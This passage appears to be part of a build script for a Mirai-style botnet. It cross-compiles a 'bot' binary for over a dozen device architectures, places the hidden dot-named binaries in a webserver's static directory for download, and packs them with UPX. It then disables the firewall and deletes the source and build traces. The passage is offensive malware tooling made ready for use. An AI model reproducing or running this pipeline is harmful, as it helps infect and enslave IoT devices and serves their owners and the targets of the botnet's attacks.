...
compile_bot i586 .Sx86 "-static -DSLAX -DREP"
compile_bot x86_64 .Sx86_64 "-static -DSLAX -DREP"
compile_bot mips .Smips "-static -DSLAX -DREP"
compile_bot mipsel .Smpsl "-static -DSLAX -DREP"
compile_bot armv4l .Sarm "-static -DSLAX -DREP"
compile_bot armv5l .Sarm5 "-static"
compile_bot armv6l .Sarm6 "-static -DSLAX -DREP"
compile_bot_arm7 armv7l .Sarm7 "-static -DSLAX -DREP"
compile_bot powerpc .Sppc "-static -DSLAX -DREP"
compile_bot sparc .Sspc "-static -DSLAX -DREP"
compile_bot m68k .Sm68k "-static -DSLAX -DREP"
compile_bot sh4 .Ssh4 "-static -DSLAX -DREP"
arc_compile arc .Sarc "-static -DSLAX -DREP"
...
rm /root/webserver/static/.* -rf
sudo cp ./release/.* /root/webserver/static/
touch index.html /root/webserver/static/
cd ./webserver/
go mod init main
go mod tidy
go build main.go
rm core go.mod go.sum main.go -rf
rm ./root/bot -rf
rm loader/src dlr -rf

wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /root/webserver/static/.*
rm -rf upx*
...
sudo ufw disable
cd
rm /root/bot /root/release /root/build.sh -rf